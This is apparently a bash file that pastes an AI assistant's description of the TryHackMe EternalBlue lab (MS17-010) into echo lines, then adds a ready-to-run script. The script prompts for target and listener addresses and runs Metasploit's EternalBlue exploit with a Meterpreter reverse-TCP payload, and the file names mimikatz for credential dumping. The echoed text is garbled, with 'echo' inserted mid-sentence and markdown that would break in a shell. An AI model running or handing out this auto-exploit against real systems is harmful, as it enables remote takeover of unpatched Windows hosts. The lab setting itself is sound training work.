Certainly!

echo ### 🧠 **EternalBlue Lab – TryHackMe (Brief Description)**

echo The **EternalBlue** lab on **TryHackMe** is designed to teach users how to exploit the **SMB vulnerability (MS17-010)** used by the echo **EternalBlue exploit**, which was developed by the NSA and leaked by the Shadow Brokers. This vulnerability affects older versions of echo **Windows** and was infamously used in the **WannaCry ransomware attack**.

echo ### 🧩 Key Learning Objectives:

echo * Understand **SMB (Server Message Block)** protocol and its weaknesses.
echo * Identify vulnerable machines using tools like **Nmap**.
echo * Exploit the MS17-010 vulnerability using tools like **Metasploit** or manual scripts (e.g., `eternalblue_exploit7.py`).
echo * Gain remote **code execution** or a **reverse shell** on a Windows machine.
echo * Learn **post-exploitation** techniques such as privilege escalation.

echo ### 🛠 Tools Commonly Used:

echo * `nmap`
echo * `smbclient`
echo * `msfconsole` (Metasploit)
echo * `exploit/windows/smb/ms17_010_eternalblue`
echo * `mimikatz` (for credential dumping)
echo Let me know if you want the **full step-by-step walkthrough** of the lab!

#!/bin/bash

# Title: EternalBlue Auto Exploit Script with User Input
# Author: For Educational Use Only

echo "[+] Starting PostgreSQL service..."
sudo service postgresql start

# Ask user for inputs
read -p "[?] Enter Target IP (RHOST): " rhost
read -p "[?] Enter Your IP (LHOST): " lhost
read -p "[?] Enter Listening Port (LPORT): " lport

# Launch Metasploit with input values
echo "[+] Launching Metasploit with your input..."
msfconsole -q -x "
use exploit/windows/smb/ms17_010_eternalblue;
set RHOSTS $rhost;
set LHOST $lhost;
set LPORT $lport;
set PAYLOAD windows/x64/meterpreter/reverse_tcp;
exploit;"
